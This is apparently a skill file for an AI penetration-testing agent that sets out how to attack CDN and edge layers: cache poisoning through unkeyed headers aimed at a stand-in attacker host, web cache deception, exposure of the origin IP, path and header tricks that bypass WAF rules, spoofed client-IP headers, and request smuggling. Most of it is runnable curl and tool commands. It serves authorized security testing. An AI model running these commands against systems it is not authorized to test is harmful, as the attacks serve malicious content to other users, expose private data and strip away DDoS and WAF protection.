---
name: cdn_edge
description: CDN/edge testing for cache poisoning, origin IP exposure, and edge-rule (WAF/routing) bypasses.
---

# CDN / Edge Infrastructure

A CDN/edge layer (Cloudflare, Akamai, Fastly/Varnish, CloudFront, Azure Front Door, Google Cloud CDN, Bunny, custom Nginx/Varnish) sits between clients and origin, caching responses and enforcing routing, TLS, and WAF rules. The attacker's objective is to make the edge serve attacker-controlled or unauthorized content to other users (cache poisoning/deception), reach the origin directly to defeat WAF and rate limiting (origin exposure), or trick edge routing/auth rules into serving content they should block (edge-rule bypass).

## Attack Surface

**Edge entry points**
- Cache key composition: which headers/params/cookies are (un)keyed determines poisoning surface
- Unkeyed inputs reflected into responses: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-For`, `X-Forwarded-Prefix`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`, custom `X-Host`/`X-Real-IP`
- Path normalization and delimiter handling: `;`, `%2f`, `..%2f`, `//`, trailing-slash, fat GET, `#` fragment truncation differences between edge and origin
- Routing/WAF rules: geo/IP allowlists, header-based auth at the edge, `robots.txt`/`/admin` blocks, signed-URL/token gates
- Origin pull config: host header sent to origin, origin auth secret, allowed origin IP ranges

**Exposed assets**
- Origin IP (defeats DDoS/WAF), origin hostname, edge API tokens, purge/management endpoints
- Cached secrets: responses that should be private (auth pages, API JSON, error stacks) cached and served to all
- SSRF pivots via misconfigured edge workers/functions (Cloudflare Workers, Lambda@Edge, Fastly Compute)

## Recon & Enumeration

Concrete commands (tools already in the Kali sandbox):

```bash
# 1. Fingerprint the edge / WAF
wafw00f https://target.tld
httpx -u https://target.tld -title -tech-detect -server -ip -cdn -location -status-code
# httpx -cdn flags whether the IP belongs to a known CDN range (uses cdncheck)

# 2. Inspect headers that reveal edge + cache behavior
httpx -u https://target.tld -include-response -hash sha256 \
  -H "Pragma: akamai-x-cache-on, akamai-x-get-cache-key, akamai-x-check-cacheable"
# Look for: Age, X-Cache(HIT/MISS), CF-Cache-Status, X-Served-By, X-Cache-Hits,
#   Via, X-Amz-Cf-Pop, X-Akamai-*, Fastly-Debug, Vary

# 3. Find subdomains + non-CDN origins (subdomains often bypass the edge)
subfinder -d target.tld -all -silent | dnsx -a -resp-only -silent | sort -u
# Resolve each candidate and compare IP against CDN ranges:
subfinder -d target.tld -silent | httpx -ip -cdn -json -silent -o hosts.json

# 4. Discover routes/params for cache-key + reflection testing
katana -u https://target.tld -jc -kf all -d 3 -silent -o urls.txt
ffuf -u https://target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404

# 5. Templated checks for CDN/edge misconfig and origin disclosure
nuclei -u https://target.tld -tags cache,cloudflare,akamai,fastly,cdn,exposure,misconfig \
  -s critical,high,medium -rl 50 -c 20 -bs 20 -timeout 10 -retries 1 -j -o cdn_nuclei.jsonl

# 6. Confirm blind/edge SSRF & cache callbacks out-of-band
interactsh-client -v   # use the *.oast.fun host in injected Host/X-Forwarded-Host
```

Asset-specific tools to install when needed:

```bash
# Origin discovery via cert/passive sources and SAN pivoting
pip install censys shodan        # censys/shodan host searches for origin IP
go install github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest   # classify IP->CDN/cloud/waf
# CNAME / fronting / takeover checks
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
# Param-Miner-style cache poisoning automation:
pip3 install web-cache-deception || git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner  # (wcvs binary)
go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest   # wcvs
# Request smuggling (CL.TE / TE.CL at the edge):
pip install smuggler || git clone https://github.com/defparam/smuggling   # smuggler.py
```

## Methodology

1. **Fingerprint the edge.** Identify CDN/WAF (`wafw00f`, `httpx -cdn`, response headers `Server`, `Via`, `CF-RAY`, `X-Amz-Cf-Id`, `X-Served-By`). Note the caching engine — behavior differs sharply across Cloudflare/CloudFront/Akamai/Fastly/Varnish.
2. **Map cache behavior.** Send the same request twice; watch `Age`, `X-Cache`, `CF-Cache-Status` flip MISS→HIT. Identify what is cached (status, extensions, paths) and the `Vary` set. Probe TTLs by re-requesting and reading `Age`.
3. **Determine the cache key.** Add/change one header or query param per request; if the response changes but cache status stays HIT (or a poisoned value persists), that input is unkeyed — the prime poisoning vector. Test `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, port in `Host`, and unkeyed query params.
4. **Hunt origin IP.** Search Censys/Shodan/SecurityTrails for the cert CN/SAN and favicon hash; check historical DNS, non-CDN subdomains (mail., dev., staging., direct-), SPF/MX records, and SSRF/error leaks. Validate any candidate by requesting the site directly with the real `Host`.
5. **Test edge-rule bypass.** For each edge-blocked path/auth/geo rule, try path normalization, method override, header overrides (`X-Original-URL`, `X-Rewrite-URL`), case/encoding, and origin-direct requests that skip the edge entirely.
6. **Test cache poisoning & deception.** Poison via unkeyed reflected inputs; deceive via path confusion (`/account.php/nonexistent.css`) so private content is cached under a static-looking key.
7. **Assess request smuggling.** Where the edge and origin disagree on `Content-Length`/`Transfer-Encoding`, smuggling can poison the socket and the cache for all users.
8. **Validate, scope blast radius, document.** Prove a second, clean client receives the poisoned/leaked response, then stop.

## Key Weaknesses / Techniques

### Cache poisoning via unkeyed headers
Reflected, unkeyed input poisons cached HTML/JS for every visitor.
```bash
# X-Forwarded-Host reflected into an absolute resource URL, unkeyed -> stored
curl -s "https://target.tld/?cb=$RANDOM" -H "X-Forwarded-Host: evil.attacker-poc.test" -D- -o resp.html
# If a <script>/<link>/redirect now points to evil.attacker-poc.test, re-request WITHOUT
# the header; a cached HIT still showing the evil host == confirmed poisoning.
grep -i "attacker-poc.test" resp.html
# Automated discovery of unkeyed/cache-affecting params and headers:
wcvs -u https://target.tld -gb /tmp/headers.txt -hw /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```
Also test `X-Forwarded-Scheme: http` / `X-Forwarded-Proto` (forces cached 301 to `http://`), `X-Forwarded-Port`, `X-Forwarded-Prefix`, and unkeyed query params (UTM-style) reflected into the page.

### Web cache deception
Trick the edge into caching authenticated/private content under a static-looking key.
```bash
# Authenticated request to a path that origin maps to a dynamic page but edge caches by extension
curl -s --cookie "session=<victim-or-self-auth>" "https://target.tld/account/profile/nonexistent.css" -D-
# If origin returns the profile (200) and edge caches it (Age increments, X-Cache: HIT),
# fetch the SAME URL unauthenticated -> if you get the victim's data, it's confirmed.
for d in .css .js .jpg /%2e%2e/x.css ';foo.css' '%00.css'; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "https://target.tld/account/profile$d"
done
```
Delimiter discrepancies (`;`, `%3b`, `%23`, `%2f`, `?`, fat-path) between edge cache-key derivation and origin routing are the root cause.

### Origin IP exposure (WAF/DDoS bypass)
```bash
# Pivot from certificate SANs / favicon / historical DNS to a direct origin IP
cdncheck -i $(dnsx -silent -a -resp-only -d target.tld | tr '\n' ',')   # which IPs are NOT behind a CDN
# Candidate validation: request the protected vhost directly, bypassing edge + WAF
curl -sk --resolve target.tld:443:<ORIGIN_IP> "https://target.tld/" -D- -o origin.html
# Compare body hash to the CDN-served page; matching content from a non-CDN IP = exposed origin.
httpx -u https://<ORIGIN_IP> -H "Host: target.tld" -title -status-code -content-length
```
Confirm the WAF is bypassed by sending a payload the edge blocks (e.g. `?q=<script>` returning 403 at edge) directly to the origin and observing it pass.

### Edge-rule / WAF bypass
```bash
# Edge blocks /admin but origin trusts X-Original-URL / path tricks
for p in "/admin" "/Admin" "/%61dmin" "/./admin" "/admin/." "/admin..;/" "/admin%2f" "//admin"; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://target.tld$p"; done
curl -s "https://target.tld/" -H "X-Original-URL: /admin" -D-      # edge routes /, origin honors override
curl -s "https://target.tld/" -H "X-Rewrite-URL: /admin" -D-
# Geo/IP allowlist bypass via spoofable client-IP headers when edge trusts them
curl -s "https://target.tld/internal" -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -D-
```

### Request smuggling at the edge
Edge and origin disagreeing on `CL`/`TE` lets one request poison the next user's response and the cache.
```bash
python3 smuggler.py -u https://target.tld          # classifies CL.TE / TE.CL / TE.TE
# Confirm desync impact carefully; a smuggled request that returns another client's response is the PoC.
```

### Secrets in edge config / workers
```bash
trufflehog filesystem ./edge-config --only-verified      # leaked origin-auth secrets, API tokens
gitleaks detect -s ./edge-config -v
semgrep --config=auto ./worker-src                       # Cloudflare Workers / Lambda@Edge SSRF, open redirect
# Cached management endpoints / exposed purge APIs:
nuclei -u https://target.tld -tags exposure,config -s high,critical -silent
```

## Validation

1. **Cache poisoning:** Inject once; then issue a clean request from a different IP/cache region (or new edge POP) with no special headers and confirm the poisoned value is returned on a cache HIT (`Age` > 0, `X-Cache: HIT`). Two distinct clients receiving the malicious payload proves cross-user impact.
2. **Web cache deception:** Authenticate as account A, prime the cache on the static-looking URL, then fetch the identical URL as an unauthenticated/account-B client and show A's private data returned. Self-to-self only; never harvest a real victim.
3. **Origin exposure:** Show the origin IP (non-CDN per `cdncheck`) returns byte-identical or clearly-the-same content with `--resolve target.tld:443:<IP>`, and that a WAF-blocked payload succeeds direct-to-origin. Capture both the edge 403 and the origin 200.
4. **Edge-rule bypass:** Capture the blocked request (403/404 at edge) and the bypass request (200 + sensitive content) side by side, including the exact header/path that triggered it.
5. Always record full request/response pairs (`-D-`), the cache-status headers, the POP/region, and a timestamp so TTL-bound findings are reproducible.

## False Positives

- `X-Cache: HIT` on truly static assets (images/CSS) with no reflected user input — caching working as designed, not poisoning.
- Reflected headers that are part of the cache key (`Vary` includes them, or cache stays MISS) — the poison is not stored cross-user; only your own request is affected.
- A "found origin IP" that is itself a CDN/cloud LB range — verify with `cdncheck`/`httpx -cdn` before claiming exposure.
- Direct-origin content that differs (default vhost, "direct access denied", error page) — origin enforces a shared secret or host check; not a usable bypass.
- 200 on a normalized path that returns the same public content as the canonical URL — not an auth bypass.
- Wildcard hosting (`*.cloudfront.net`) responding to arbitrary Host headers with generic errors — not an SSRF/poisoning sink.
- OAST callback whose source IP is the tester/browser, not the edge/origin — client-side, not server-side.

## Chaining & Impact

- Unkeyed header → cache poisoning → stored XSS/malicious JS served to all users → mass session theft / account takeover.
- `X-Forwarded-Scheme` poisoning → cached redirect-to-`http` or open redirect → credential interception / token leak.
- Web cache deception → other users' PII/API tokens cached publicly → account takeover, data breach.
- Origin IP exposure → bypass WAF + rate limiting + DDoS protection → unthrottled credential stuffing, exploit delivery, and L7 DoS straight at origin.
- Edge auth/geo bypass (`X-Original-URL`, spoofed `X-Forwarded-For`) → reach admin/internal panels the edge was meant to gate.
- Request smuggling → cache poisoning + request hijacking → harvest other users' authenticated responses, persistent edge-wide compromise.
- Edge worker SSRF / leaked origin-auth secret → forge trusted-edge requests to origin, defeating origin's "only the CDN can reach me" assumption.

## Pro Tips

1. Cache behavior is per-extension and per-path — a header unkeyed on `/` may be keyed on `/api`. Test poisoning on the highest-traffic cacheable HTML page, not just the root.
2. Bust the cache with a junk query param (`?cb=<rand>`) while probing so you study origin behavior, then drop it to test what actually gets stored.
3. Different POPs hold different caches; verify cross-user impact from a second region (proxy/VPN or a different resolver) — a HIT on your own POP can mislead.
4. Many WAFs only inspect the first body bytes or specific content-types; smuggling and chunked/oversized bodies slip payloads past the edge to origin.
5. The origin's host/IP allowlist often trusts a static "origin auth" header the CDN injects — if you find that secret (`trufflehog`/leaked config), you can hit origin directly while appearing to be the edge.
6. Trailing-dot, double-slash, and case variants frequently differ between edge cache-key normalization and origin routing — cheap, high-yield bypass primitives.
7. Check `robots.txt`, sitemaps, and JS bundles for origin/staging hostnames; devs routinely leave direct-origin URLs hardcoded.
8. Keep poison payloads benign and self-targeted (`evil.attacker-poc.test`, your own session) and purge/let TTL expire after PoC to avoid lingering impact on real users.
